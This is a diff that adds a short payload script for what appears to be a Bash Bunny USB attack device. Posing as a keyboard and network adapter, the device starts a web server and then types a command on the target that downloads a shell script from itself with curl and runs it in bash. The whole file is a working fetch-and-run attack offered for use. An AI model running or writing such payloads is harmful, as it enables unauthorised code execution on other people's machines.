@@ -1,0 +1,16 @@
+LED B 100
+ATTACKMODE HID STORAGE ECM_ETHERNET
+sleep 3
+LED R SLOW
+GET HOST_IP
+GET SWITCH_POSITION
+udisk mount
+cd /root/udisk/payloads/$SWITCH_POSITION/
+python webserver.py &
+sleep 2
+while true; do [[ $(curl $HOST_IP:8080) ]] && break ; done
+
+## can put GET TARGET_OS here to expand this to support a range of systems
+RUN UNITY bash \<\(curl http\:\/\/$HOST_IP\:8080\/bashbunnycode\.sh\)
+
+LED G 0
